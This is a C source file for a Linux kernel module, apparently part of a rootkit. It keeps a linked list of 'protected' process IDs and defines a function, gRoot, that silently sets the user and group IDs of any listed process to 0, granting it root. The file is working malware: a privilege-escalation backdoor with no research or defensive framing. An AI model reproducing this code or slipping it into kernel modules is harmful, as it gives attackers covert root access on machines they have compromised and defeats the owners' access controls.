#include <linux/module.h>
#include "inc/util.h"
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");

pid_node_t *protected_pids_head = NULL;

void addPid(pid_t pid)
{
  pid_node_t *node = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
  if (!node) return;
  node->pid = pid;
  node->next = protected_pids_head;
  protected_pids_head = node;
}

void removePid(pid_t pid)
{
  pid_node_t *cur = protected_pids_head, *prev = NULL;
  while (cur)
    {
      if (cur->pid == pid)
        {
          if (prev) prev->next = cur->next;
          else protected_pids_head = cur->next;
          kfree(cur);
          return;
        }
      prev = cur;
      cur = cur->next;
    }
}

bool isProtected(pid_t pid)
{
  pid_node_t *cur = protected_pids_head;
  while (cur)
    {
      if (cur->pid == pid) return true;
      cur = cur->next;
    }
  return false;
}

void clearProtected(void)
{
  pid_node_t *cur = protected_pids_head, *tmp;
  while (cur)
    {
      tmp = cur;
      cur = cur->next;
      kfree(tmp);
    }
  protected_pids_head = NULL;
}

void gRoot(void)
{
  if (isProtected(current->pid))
    {
      struct cred *newcreds = prepare_creds();
      if (newcreds)
        {
          newcreds->uid.val  = 0;
          newcreds->gid.val  = 0;
          newcreds->euid.val = 0;
          newcreds->egid.val = 0;
          commit_creds(newcreds);
        }
    }
}
